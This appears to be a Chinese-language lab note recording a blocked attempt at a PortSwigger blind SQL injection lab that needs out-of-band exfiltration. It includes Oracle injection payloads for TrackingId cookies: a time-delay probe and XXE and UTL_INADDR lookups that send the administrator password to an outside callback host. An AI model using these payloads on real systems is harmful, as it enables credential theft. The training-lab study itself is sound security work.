---
title: "lab-out-of-band-data-exfiltration"
links:
  - target: oob-callback-family
    relation: evidences
  - target: blind-injection-family
    relation: evidences
---

# lab-out-of-band-data-exfiltration

> evidences: [[oob-callback-family]], [[blind-injection-family]]

PortSwigger `sql-injection/blind/lab-out-of-band-data-exfiltration`(第 30 批,2026-10-06)。

- 实例:`https://0a7a00f404387631808c1c0400b3000a.web-security-academy.net/`(shop app,自带 `TrackingId` cookie)。
- 判定:**blocked(外依赖:Burp Collaborator)**。按纪律快速实证后收束,不做无限重试。

## 已实证的"墙"

1. **题面自己写明**:「our firewall blocks interactions between the labs and arbitrary external systems.
   To solve the lab, you must use Burp Collaborator's default public server.」
2. **注入点无同步信道**:
   - `TrackingId=xyz` → 200(11447B);`TrackingId=xyz'`(语法错) → **200、同长度**(应用吞掉 DB 错误);
   - Oracle 延时(标准时延件)`xyz'||(SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual)||'`
     → **1s 内 200** → 查询果然异步("has no effect on the application's response"),无时间/条件信道。
3. **自建 OOB 端点零到达**(与批 18 结论一致):
   - marker `m17912378433674834952262678140727037600784`(`*.oob.dthack.io` DNS 腿 + `ns.oob.dthack.io:9999` HTTP 腿);
   - 用 **jar 内 TrackingId** 直接放 payload(lab_http 的 `--header 'Cookie: …'` 会与 jar cookie 合并成两条 Cookie,
     用空 jar + header 才确保发的是 payload);
   - 试了 Oracle XXE(`EXTRACTVALUE(xmltype('…<!ENTITY % remote SYSTEM "http://<marker>.oob.dthack.io/">…'))`)
     与 `UTL_INADDR.get_host_address('<marker>.oob.dthack.io')`;
   - `oob_poll poll <marker>` 两轮(45s / 60s 租约,`--source both`)→ `no interaction observed`。
4. 官方 Collaborator 公共服 `https://oastify.com/` 从本机可直达(200,仅一句说明页),但
   **交互读取协议只在 Burp 客户端里**(无公开 API);`burpcollaborator.net` 从本机还直接 TLS 失败(UnknownIssuer)。

## 解除阻塞所需的外部动作

- 一个能用的 Burp Collaborator 客户端(或任何能轮询 Collaborator 的等价实现),把 payload 设成
  `<random>.oastify.com` 并在 Burp 侧读交互 → 拿 `users.password`(administrator)→ 登录 → 翻牌。

## 备好的 payload 形状(待有 Collaborator 时可直接用)

```
TrackingId=xyz'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.<COLLAB>/"> %remote;]>'),'/l') FROM dual)||'
TrackingId=xyz'||(SELECT UTL_INADDR.get_host_address((SELECT password FROM users WHERE username='administrator')||'.<COLLAB>') FROM dual)||'
```

## 教训

- 这类"必须用 Collaborator"的题在本环境属**结构性不可解**;先测同步信道(时延/条件错误)再看 OOB,能省大量时间。
- 用 cookie 注入时留意 lab_http 的 **双 Cookie 头**问题:要确保 payload 生效,用空 jar + `--header 'Cookie: ...'`。
